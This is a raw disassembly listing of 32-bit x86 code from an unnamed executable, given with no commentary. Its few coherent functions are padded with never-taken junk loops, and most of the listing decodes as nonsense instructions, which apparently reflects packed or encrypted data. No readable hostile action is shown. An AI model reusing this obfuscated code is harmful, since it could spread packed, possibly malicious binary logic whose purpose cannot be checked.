  405a8a:	xchg   esp,eax
  405a8b:	mov    esp,0x85ed4760
  405a90:	pop    ds
  405a91:	cmp    DWORD PTR [ecx-0x84485e4],0x4a
  405a98:	cs addr16 mov ebx,0xdf934bb7
  405a9f:	ret    0x222e
  405aa2:	push   esp
  405aa3:	jl     0x405b1e
  405aa5:	outs   dx,DWORD PTR cs:[esi]
  405aa7:	mov    edi,0x8c2591d5
  405aac:	push   ds
  405aad:	adc    ebp,DWORD PTR [ebx+0x4b]
  405ab0:	mov    eax,0xd52e3bdd
  405ab5:	pop    ecx
  405ab6:	sbb    al,0x50
  405ab8:	inc    ebp
  405ab9:	ror    DWORD PTR [esi+0x76],1
  405abc:	sti    
  405abd:	sub    DWORD PTR [ebp-0x15a92f4a],ecx
  405ac3:	inc    ecx
  405ac4:	xchg   ecx,eax
  405ac5:	and    eax,0x9f9b0218
  405aca:	call   0x4ad8:0xf04cb4f1
  405ad1:	sbb    BYTE PTR [edx+0x64fca9b9],dl
  405ad7:	jb     0x405ad0
  405ad9:	icebp  
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43431d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4342a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434329,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432cce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434296,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43426e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432cc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43426e,0x4325fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432cc6,0x432cda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434276,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434276
  405b85:	inc    eax
  405b86:	mov    ds:0x434276,eax
  405b8b:	cmp    DWORD PTR ds:0x434276,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434276,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432bee
  405bb0:	cmp    DWORD PTR ds:0x434276,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434276
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434276,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434282,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432cd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434272,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434272
  405c26:	inc    eax
  405c27:	mov    ds:0x434272,eax
  405c2c:	cmp    DWORD PTR ds:0x434272,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434272,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4328c6
  405c56:	cmp    DWORD PTR ds:0x434272,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434272
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434272,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4325ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4325ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4325ec,eax
  405c93:	cmp    DWORD PTR ds:0x4325ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4325ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432bf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432600,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43429a
  405cd4:	adc    DWORD PTR ds:0x434272,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432cce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432cce
  405cff:	inc    eax
  405d00:	mov    ds:0x432cce,eax
  405d05:	cmp    DWORD PTR ds:0x432cce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432cce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4327ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432b36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432cca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43432d,0x432cd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4325fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405da5:	sar    ebx,0xc4
  405da8:	mov    esi,DWORD PTR [eax+esi*2]
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405e1b
  405db1:	repnz scas eax,DWORD PTR es:[edi]
  405db3:	add    DWORD PTR [edx+eax*4+0x32],0xbfe842f
  405dbb:	jo     0x405d83
  405dbd:	push   0xfffffff0
  405dbf:	mov    ebp,0x24527508
  405dc4:	xchg   DWORD PTR [edx-0x11],ecx
  405dc7:	(bad)  [ecx]
  405dc9:	in     al,0x1c
  405dcb:	xchg   ebx,eax
  405dcc:	sbb    esi,esi
  405dce:	jno    0x405e14
  405dd0:	shr    dl,1
  405dd2:	mov    bl,BYTE PTR ds:0x124997a7
  405dd8:	scas   eax,DWORD PTR es:[edi]
  405dd9:	(bad)  
  405ddb:	cli    
  405ddc:	mov    ebx,0xc18c51c8
  405de1:	je     0x405da9
  405de3:	dec    edi
  405de4:	arpl   WORD PTR [edx+eax*1-0x3d],di
  405de8:	mov    dl,0xca
  405dea:	or     eax,0x9a9bfc6a
  405def:	cmp    esp,ebp
  405df1:	mov    edi,0x300e4094
  405df6:	sub    al,ch
  405df8:	ins    BYTE PTR es:[edi],dx
  405df9:	or     bh,BYTE PTR [ebx+0x1eccaa5a]
  405dff:	mov    esp,0xef933fab
  405e04:	xor    ch,al
  405e06:	mov    ebx,0x797e18f4
  405e0b:	ss sti 
  405e0d:	push   es
  405e0e:	mov    DWORD PTR [eax-0x7355e430],0x3e3c5135
  405e18:	fld    DWORD PTR [eax-0x1d]
  405e1b:	scas   al,BYTE PTR es:[edi]
  405e1c:	xchg   eax,eax
  405e1e:	and    al,0x39
  405e20:	outs   dx,DWORD PTR ds:[esi]
  405e21:	or     dl,BYTE PTR [ebx]
  405e23:	adc    dh,al
  405e25:	xchg   edi,edx
  405e27:	adc    bh,BYTE PTR [edi-0x17]
  405e2a:	pop    es
  405e2b:	pop    ebx
  405e2c:	(bad)  
  405e2d:	xchg   edx,eax
  405e2e:	sbb    DWORD PTR [edi+0x2e357565],esp
  405e34:	mov    dl,BYTE PTR [esp+esi*2-0x4f843665]
  405e3b:	mov    edx,ecx
  405e3d:	or     ax,0xf6c3
  405e41:	pop    esp
  405e42:	(bad)  
  405e43:	adc    eax,0xf95a1a10
  405e48:	and    DWORD PTR [esi-0x3a5b222d],0xffffff8c
  405e4f:	inc    edi
  405e50:	jl     0x405dfa
  405e52:	mov    dh,0x26
  405e54:	fbld   TBYTE PTR [ecx+0x71]
  405e57:	dec    ecx
  405e58:	cwde   
  405e59:	xor    ch,0x13
  405e5c:	cld    
  405e5d:	add    ch,BYTE PTR [edi+0x37b70036]
  405e63:	mov    esi,0x15c053b5
  405e68:	pusha  
  405e69:	fcom   DWORD PTR ss:[ebp+0x2a075482]
  405e70:	popf   
  405e71:	push   esi
  405e72:	add    eax,0xc10d58e6
  405e77:	je     0x405dfc
  405e79:	pop    edx
  405e7a:	mov    al,ah
  405e7c:	js     0x405e10
  405e7e:	or     DWORD PTR ds:0x57c3330a,ecx
  405e84:	ret    0xcc3e
  405e87:	push   ebp
  405e88:	into   
  405e89:	cmp    al,0x27
  405e8b:	sub    eax,0x8c679f91
  405e90:	cmc    
  405e91:	in     al,dx
  405e92:	adc    BYTE PTR [edi+0xee2b366],cl
  405e98:	shr    BYTE PTR [ebp+0x63874aa8],0x2c
  405e9f:	shl    BYTE PTR ds:0x6152b3cd,0x86
  405ea6:	or     eax,0x8101cdb6
  405eab:	loope  0x405e90
  405ead:	and    eax,0xe8693224
  405eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb3:	dec    ebp
  405eb4:	jge    0x405e43
  405eb6:	out    0xa6,al
  405eb8:	mov    esp,0x598c306d
  405ebd:	fcom   QWORD PTR [ebp+0x4e]
  405ec0:	mov    al,0xfa
  405ec2:	dec    edi
  405ec3:	ss in  eax,0xd9
  405ec6:	cmp    dl,BYTE PTR [eax+ecx*8]
  405ec9:	fs push edi
  405ecb:	test   eax,0xa859d42e
  405ed0:	push   esi
  405ed1:	ror    BYTE PTR [ebx-0x29],0x21
  405ed5:	mov    ebx,0xb66e556e
  405eda:	add    edx,DWORD PTR [ecx-0x18f0a3c8]
  405ee0:	jne    0x405eb4
  405ee2:	pusha  
  405ee3:	bound  edx,QWORD PTR [eax]
  405ee5:	jg     0x405ec0
  405ee7:	jmp    0xb2efbf3d
  405eec:	(bad)  
  405eee:	cwde   
  405eef:	lods   eax,DWORD PTR ds:[esi]
  405ef0:	lods   al,BYTE PTR ds:[esi]
  405ef1:	add    al,0xc2
  405ef3:	jnp    0x405ee9
  405ef5:	or     al,0x8c
  405ef7:	(bad)  
  405ef8:	retf   
  405ef9:	jb     0x405f15
  405efb:	mov    edi,0xf39417ec
  405f00:	rcr    DWORD PTR [eax-0x62912278],0x22
  405f07:	in     al,dx
  405f08:	sub    BYTE PTR [ecx],dh
  405f0a:	test   DWORD PTR [esi],edi
  405f0c:	and    dh,bh
  405f0e:	pop    edx
  405f0f:	scas   al,BYTE PTR es:[edi]
  405f10:	sbb    eax,0x57f9d35f
  405f15:	pop    edx
  405f16:	pop    ebp
  405f17:	ret    0x3c60
  405f1a:	mov    bh,ch
  405f1c:	das    
  405f1d:	test   eax,0xd9684ac4
  405f22:	mov    edx,DWORD PTR [esi-0x6973ea87]
  405f28:	add    eax,0xf0951671
  405f2d:	leave  
  405f2e:	into   
  405f2f:	mov    ebx,0x89e7ffea
  405f34:	jo     0x405f4d
  405f36:	sub    ecx,DWORD PTR [esi+0xf]
  405f39:	iret   
  405f3a:	test   edi,ecx
  405f3c:	mov    ds:0xfd09de78,al
  405f41:	jp     0x405fb5
  405f43:	sar    esi,1
  405f45:	add    bh,bl
  405f47:	add    dh,dl
  405f49:	sti    
  405f4a:	sbb    cl,al
  405f4c:	aad    0x4d
  405f4e:	sti    
  405f4f:	xor    BYTE PTR [eax-0x2b],al
  405f52:	jnp    0x405fb7
  405f54:	shl    DWORD PTR [esi+0x23],0x70
  405f58:	fs int3 
  405f5a:	shl    BYTE PTR [esi-0x7c42e262],1
  405f60:	cmc    
  405f61:	pop    edx
  405f62:	popf   
  405f63:	mov    esp,0x78ff94c7
  405f68:	lds    eax,FWORD PTR [ebp-0x6c2a63cf]
  405f6e:	pop    eax
  405f6f:	in     al,0xa1
  405f71:	(bad)  
  405f72:	shl    BYTE PTR [esi-0x54a2bdfe],1
  405f78:	mov    DWORD PTR [ebx],esp
  405f7a:	(bad)  
  405f7b:	out    0x4b,al
  405f7d:	iret   
  405f7e:	cmp    al,0x19
  405f80:	jno    0x405f1e
  405f82:	repz pop ebx
  405f84:	or     bl,BYTE PTR [edi+0x1b8dfe1f]
  405f8a:	call   0x2fb5:0x325812d9
  405f91:	sub    BYTE PTR [ebx+0x410e6881],cl
  405f97:	pop    ebp
  405f98:	mov    edx,0x66c2c23d
  405f9d:	imul   ebp,edx,0xffffffa8
  405fa0:	dec    edi
  405fa1:	nop
  405fa2:	stos   DWORD PTR es:[edi],eax
  405fa3:	xor    al,0x3
  405fa5:	lods   eax,DWORD PTR ds:[esi]
  405fa6:	mov    al,cl
  405fa8:	(bad)
  405fab:	push   eax
  405fac:	outs   dx,BYTE PTR ds:[esi]
  405fad:	jp     0x405fd0
  405faf:	aam    0xfc
  405fb1:	adc    eax,0x5e65b349
  405fb6:	mov    ecx,0xae6429a0
  405fbb:	xchg   edx,eax
  405fbc:	enter  0x4d02,0x4d
  405fc0:	pusha  
  405fc1:	test   BYTE PTR [edi],al
  405fc3:	sub    edx,ebx
  405fc5:	sbb    edi,esi
  405fc7:	retf   0x7c25
  405fca:	call   0x58002c3f
  405fcf:	ret    0xc165
  405fd2:	fadd   QWORD PTR [esi]
  405fd4:	mov    ch,0x61
  405fd6:	xchg   ebp,eax
  405fd7:	out    dx,al
  405fd8:	mov    eax,0xb974d5c1
  405fdd:	fidivr WORD PTR [esi]
  405fdf:	pop    esi
  405fe0:	in     al,0xe9
  405fe2:	dec    eax
  405fe3:	ds adc al,0x8a
  405fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe7:	pusha  
  405fe8:	xchg   BYTE PTR [edx-0x34d22852],ah
  405fee:	rcl    DWORD PTR [ebp-0x10],1
  405ff1:	cmp    al,0xef
  405ff3:	mov    cl,0xd4
  405ff5:	test   bh,dl
  405ff7:	xor    al,0xeb
  405ff9:	adc    eax,0x8e419a2
  405ffe:	dec    edi
  405fff:	imul   ebp,DWORD PTR [edx+0x67],0x51b41154
  406006:	sub    ah,BYTE PTR ds:0x713d3edc
  40600c:	mov    esp,DWORD PTR [esi]
  40600e:	dec    ecx
  40600f:	movnti DWORD PTR [ebp+0x5f],edx
  406013:	in     al,0xf8
  406015:	dec    ebx
  406016:	mov    esp,0x4ed3845e
  40601b:	push   es
  40601c:	and    ebx,DWORD PTR [esi]
  40601e:	push   ebp
  40601f:	lahf   
  406020:	mov    eax,0xc6c41bd4
  406025:	pop    ss
  406026:	inc    edx
  406027:	push   ecx
  406028:	in     al,0xd
  40602a:	and    BYTE PTR [ebx],ch
  40602c:	mov    DWORD PTR [esi+0x45],ebx
  40602f:	std    
  406030:	inc    ebx
  406031:	pop    esi
  406032:	ret    
  406033:	addr16 mov ah,0x10
  406036:	mov    BYTE PTR [edx-0xe14442e],dh
  40603c:	jl     0x406047
  40603e:	dec    edx
  40603f:	push   ecx
  406040:	mov    bh,0xc8
  406042:	pop    esp
  406043:	lock es js 0x406002
  406047:	sti    
  406048:	aad    0xfd
  40604a:	mov    bl,0x59
  40604c:	and    DWORD PTR [eax+0x55],ecx
  40604f:	arpl   dx,dx
  406051:	dec    ecx
  406052:	loope  0x4060ba
  406054:	adc    eax,DWORD PTR [edx-0x12]
  406057:	bound  ebx,QWORD PTR [ebx]
  406059:	jmp    0x40609e
  40605b:	xor    dh,BYTE PTR [edx-0x59]
  40605e:	arpl   bp,cx
  406060:	cli    
  406061:	mov    ch,0x66
  406063:	mov    esi,0x641851f5
  406068:	sbb    dl,BYTE PTR [edx-0x11]
  40606b:	mul    DWORD PTR [ecx+0x5038275e]
  406071:	xchg   esi,eax
  406072:	jb     0x4060db
  406074:	repz push ecx
  406076:	jno    0x406095
  406078:	push   ebx
  406079:	(bad)  
  40607a:	cli    
  40607b:	jg     0x406044
  40607d:	std    
  40607e:	jge    0x406071
  406080:	test   BYTE PTR [esi],cl
  406082:	aaa    
  406083:	clc    
  406084:	pop    edi
  406085:	pop    ecx
  406086:	and    DWORD PTR [eax+0x32f8772],0x4b
  40608d:	jmp    0x4dec2e4b
  406092:	lods   eax,DWORD PTR ds:[esi]
  406093:	rcr    BYTE PTR ds:[eax+eax*2-0x27cd6904],0x93
  40609c:	pop    ebx
  40609d:	cld    
  40609e:	es push 0xbbcc5a36
  4060a4:	test   dl,0x26
  4060a7:	inc    esp
  4060a8:	sbb    eax,0xa65e25b3
  4060ad:	xchg   edx,eax
  4060ae:	aas    
  4060af:	jne    0x4060e1
  4060b1:	mov    al,ds:0xe5e211b4
  4060b6:	enter  0xd274,0xee
  4060ba:	call   0x8ff5:0x6d9c7171
  4060c1:	add    DWORD PTR [ebx],ebp
  4060c3:	in     eax,0x45
  4060c5:	xchg   BYTE PTR [eax+0x1f1d9d25],ch
  4060cb:	mov    ebp,ecx
  4060cd:	xlat   BYTE PTR ds:[ebx]
  4060ce:	cmp    eax,0x4ecd589c
  4060d3:	cmp    al,BYTE PTR [edi-0xd]
  4060d6:	call   FWORD PTR [esi+0x30]
  4060d9:	add    dl,BYTE PTR [ebp+0x1d5f29f9]
  4060df:	adc    al,0x33
  4060e1:	mov    BYTE PTR [ecx],0x3d
  4060e4:	mov    esi,0xbf00432c
  4060e9:	pushf  
  4060ea:	jb     0x40611e
  4060ec:	add    BYTE PTR [ecx+0x43431d25],al
  4060f2:	add    BYTE PTR [ebp+0x3e],bh
  4060f5:	add    BYTE PTR [eax],al
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40610b:	jb     0x406109
  40610d:	sub    al,0xbb
  40610f:	xor    DWORD PTR [eax+0x70],esi
  406112:	and    BYTE PTR [ebp+0x70],bh
  406115:	jo     0x40610a
  406117:	sti    
  406118:	clc    
  406119:	fld    QWORD PTR [ecx+0x5298e3ff]
  40611f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406120:	cmp    al,0x4c
  406122:	out    0x3a,al
  406124:	sbb    bl,0xa2
  406127:	enter  0x442,0x3f
  40612b:	cs xor eax,0xd1b67f7f
  406131:	mov    edx,0x3ae12086
  406136:	test   eax,0x46b614de
  40613b:	imul   edx,DWORD PTR [ebp+eax*1-0x4785647d],0xffffffb0
  406143:	push   ds
  406144:	popa   
  406145:	jmp    0x406120
  406147:	inc    esp
  406148:	je     0x406170
  40614a:	ins    DWORD PTR es:[edi],dx
  40614b:	int    0xb6
  40614d:	jbe    0x4060e8
  40614f:	popa   
  406150:	xor    DWORD PTR [ebx-0x4afc4ca6],ebp
  406156:	cmp    al,0x8d
  406158:	clc    
  406159:	inc    esi
  40615a:	test   eax,ebx
  40615c:	sbb    BYTE PTR [edi],0xab
  40615f:	pop    DWORD PTR [edx-0x69]
  406162:	mov    DWORD PTR [esi+0x28],esi
  406165:	lods   al,BYTE PTR ds:[esi]
  406166:	imul   edi,DWORD PTR [esi+0x1d014e72],0xffffff89
  40616d:	push   ebx
  40616e:	mov    al,ds:0xfc158688
  406173:	xor    edi,0xba58aef2
  406179:	lock int3 
  40617b:	test   ax,0x3e6b
  40617f:	les    eax,FWORD PTR [ecx+edi*8-0x6c]
  406183:	inc    edx
  406184:	mov    edx,0xd2cb47e6
  406189:	cmc    
  40618a:	out    dx,al
  40618b:	je     0x40616c
  40618d:	and    eax,eax
  40618f:	sbb    edi,DWORD PTR [edi+0x78]
  406192:	loop   0x406118
  406194:	retf   0xb8ca
  406197:	aaa    
  406198:	mov    dh,0x7
  40619a:	das    
  40619b:	shr    edx,cl
  40619d:	push   ecx
  40619e:	(bad)  
  40619f:	mov    edi,0x9a320c1e
  4061a4:	and    BYTE PTR [eax+0x6e],dl
  4061a7:	jbe    0x406192
  4061a9:	sub    BYTE PTR [ebp-0x14],bh
  4061ac:	sbb    eax,0x768ef0e4
  4061b1:	ficom  WORD PTR [ebx]
  4061b3:	push   edi
  4061b4:	inc    edx
  4061b5:	fcmovu st,st(4)
  4061b7:	and    DWORD PTR [ecx-0x55362cae],esp
  4061bd:	add    BYTE PTR [edx-0x270d8269],0xb4
  4061c4:	jge    0x40617f
  4061c6:	lock pop ebp
  4061c8:	mov    ds:0x457e0745,eax
  4061cd:	std    
  4061ce:	cld    
  4061cf:	stos   BYTE PTR es:[edi],al
  4061d0:	xchg   esp,eax
  4061d1:	imul   esp,DWORD PTR [ecx+ebp*8-0x77],0xa8f1addf
  4061d9:	cmp    eax,0xbb2043aa
  4061de:	pop    es
  4061df:	push   esi
  4061e0:	daa    
  4061e1:	aas    
  4061e2:	mov    ds:0x66c4d444,eax
  4061e7:	dec    edx
  4061e8:	daa    
  4061e9:	jle    0x4061c4
  4061eb:	mov    bl,BYTE PTR ds:[edx-0x3b809b45]
  4061f2:	mov    edi,0x42fefebc
  4061f7:	mov    edx,DWORD PTR ds:0x50bb33f0
  4061fd:	mov    ds:0x26af8acd,eax
  406202:	push   cs
  406203:	test   al,0x99
  406205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406206:	enter  0xfdd9,0x9c
  40620a:	fwait
  40620b:	in     al,dx
  40620c:	fidiv  DWORD PTR ds:0x74c1ed8f
  406212:	repnz les esp,FWORD PTR [ebp+0x7ebdd6b4]
  406219:	in     eax,dx
  40621a:	or     al,0xf5
  40621c:	cdq    
  40621d:	or     DWORD PTR [ebp+0x7b],edx
  406220:	into   
  406221:	shl    DWORD PTR [edi-0x6e],1
  406224:	arpl   WORD PTR [eax],sp
  406226:	and    eax,0xa88750ae
  40622b:	xor    cl,BYTE PTR [ecx+0xd]
  40622e:	mov    BYTE PTR [eax],bh
  406230:	cli    
  406231:	mov    bh,0x58
  406233:	rcl    BYTE PTR ds:0x47bd1311,0xb0
  40623a:	stos   DWORD PTR es:[edi],eax
  40623b:	dec    edi
  40623c:	(bad)  
  40623d:	xlat   BYTE PTR ds:[ebx]
  40623e:	icebp  
  40623f:	xchg   BYTE PTR [esi-0x2754fc91],ah
  406245:	xor    DWORD PTR [edx+0x78],esp
  406248:	mov    dh,0xad
  40624a:	push   edx
  40624b:	lods   eax,DWORD PTR ds:[esi]
  40624c:	xchg   ebx,eax
  40624d:	in     eax,0x1a
  40624f:	mov    WORD PTR [ebp-0x1a3257f6],?
  406255:	sub    eax,0x67e154e5
  40625a:	sahf   
  40625b:	and    BYTE PTR [ebp-0x7556a75a],ah
  406261:	rcl    BYTE PTR [edi-0x175c5a44],cl
  406267:	mov    ebp,0x5b7612ac
  40626c:	shl    DWORD PTR [esi+0x53674803],1
  406272:	mov    edi,0x988a0ff4
  406277:	sub    eax,0xd7404ff6
  40627c:	icebp  
  40627d:	and    DWORD PTR [edi],0x106809f1
  406283:	or     DWORD PTR [esi+esi*8],eax
  406286:	lahf   
  406287:	mov    dl,0x64
  406289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628a:	xor    DWORD PTR [ecx],edx
  40628c:	jg     0x4062be
  40628e:	(bad)  
  40628f:	ret    0xcfe5
  406292:	aam    0x2e
  406294:	fld    TBYTE PTR [ecx-0x15]
  406297:	add    edx,DWORD PTR [esi]
  406299:	cmc    
  40629a:	fistp  WORD PTR [eax-0x6381aa54]
  4062a0:	repz pop ds
  4062a2:	mov    cl,0x27
  4062a4:	xor    al,ch
  4062a6:	and    ebx,ebp
  4062a8:	test   BYTE PTR [ebx-0x3cc4f5d0],bh
  4062ae:	les    esp,FWORD PTR [ebp+0x16629f44]
  4062b4:	mov    bh,0x36
  4062b6:	sub    BYTE PTR [ebp-0x52],dl
  4062b9:	pop    ds
  4062ba:	sti    
  4062bb:	add    BYTE PTR [eax],ch
  4062bd:	ins    DWORD PTR es:[edi],dx
  4062be:	stc    
  4062bf:	adc    BYTE PTR [edx-0x5d],dl
  4062c2:	popf   
  4062c3:	jno    0x40632b
  4062c5:	out    dx,al
  4062c6:	push   esi
  4062c7:	xor    ch,BYTE PTR [eiz*8-0x3a9cb97d]
  4062ce:	adc    ebp,DWORD PTR [ecx+0x55]
  4062d1:	or     al,BYTE PTR [eax]
  4062d3:	ja     0x406272
  4062d5:	retf   
  4062d6:	shl    DWORD PTR [ebx+esi*1-0x4],0x5a
  4062db:	retf   0xc8d5
  4062de:	mov    ebx,0xfe208e74
  4062e3:	cmp    al,BYTE PTR [ecx]
  4062e5:	mov    eax,ds:0x4da93b53
  4062ea:	scas   al,BYTE PTR es:[edi]
  4062eb:	mov    ecx,0xa1950a9
  4062f0:	pop    edx
  4062f1:	mov    al,0x2b
  4062f3:	push   ebx
  4062f4:	add    al,0x63
  4062f6:	adc    DWORD PTR [ecx-0x567fb26e],ebp
  4062fc:	data16 xor al,0xc6
  4062ff:	leave  
  406300:	pop    edx
  406301:	fs jl  0x4062f2
  406304:	dec    edx
  406305:	sbb    DWORD PTR [ebx+0x132c715a],ecx
  40630b:	inc    esi
  40630c:	and    al,0x1a
  40630e:	loope  0x4062b3
  406310:	add    esp,DWORD PTR [ebp+0x1f25299b]
  406316:	push   ecx
  406317:	jne    0x4062de
  406319:	adc    BYTE PTR [ecx],bh
  40631b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40631c:	inc    edx
  40631d:	repnz rdpmc 
  406320:	pmaxsw mm3,QWORD PTR [ecx-0x7f63267b]
  406327:	push   cs
  406328:	stos   BYTE PTR es:[edi],al
  406329:	(bad)  [ecx+0x2dc11c87]
  40632f:	xor    ecx,edi
  406331:	enter  0xafec,0x74
  406335:	add    ebx,DWORD PTR [ecx-0xee8eef6]
  40633b:	outs   dx,BYTE PTR ds:[esi]
  40633c:	out    dx,al
  40633d:	add    eax,0xf9cd8c88
  406342:	pop    es
  406343:	cwde   
  406344:	scas   al,BYTE PTR es:[edi]
  406345:	pop    eax
  406346:	ja     0x406356
  406348:	jne    0x406358
  40634a:	cmp    BYTE PTR [ecx+esi*2-0x497522da],al
  406351:	hlt    
  406352:	xor    esi,esi
  406354:	pop    esp
  406355:	inc    ebx
  406356:	add    BYTE PTR [edx+0x671cb3c0],dl
  40635c:	(bad)  
  40635d:	scas   eax,DWORD PTR es:[edi]
  40635e:	add    cl,al
  406360:	mov    ebx,0xd79febe8
  406365:	in     eax,0x2f
  406367:	sub    bh,BYTE PTR [ecx]
  406369:	rcr    DWORD PTR [ecx],cl
  40636b:	jl     0x4063e0
  40636d:	ficomp DWORD PTR [ebp+0x2abe483e]
  406373:	or     al,0x5b
  406375:	adc    BYTE PTR [ebx],dl
  406377:	cwde   
  406378:	mov    edx,0x10bfb1a1
  40637d:	inc    esi
  40637e:	jno    0x406381
  406380:	or     eax,0x8ec289eb
  406385:	(bad)  [ebx]
  406387:	sar    BYTE PTR ds:0x780a545f,cl
  40638d:	mov    cs,WORD PTR [ecx+0x65]
  406390:	or     DWORD PTR ds:0x720909db,0xffffffd5
  406397:	lods   eax,DWORD PTR ds:[esi]
  406398:	sbb    dl,BYTE PTR [esi+eiz*8]
  40639b:	or     al,0x3c
  40639d:	test   ebp,0xd0020fe9
  4063a3:	(bad)  
  4063a4:	std    
  4063a5:	pop    eax
  4063a6:	out    0x15,eax
  4063a8:	push   ecx
  4063a9:	pop    edx
  4063aa:	sti    
  4063ab:	push   ecx
  4063ac:	and    bl,BYTE PTR [ebx-0x3e12d639]
  4063b2:	imul   edx,DWORD PTR [edi],0x18
  4063b5:	mov    dl,0xcd
  4063b7:	std    
  4063b8:	es and al,0x82
  4063bb:	and    al,0x17
  4063bd:	inc    esp
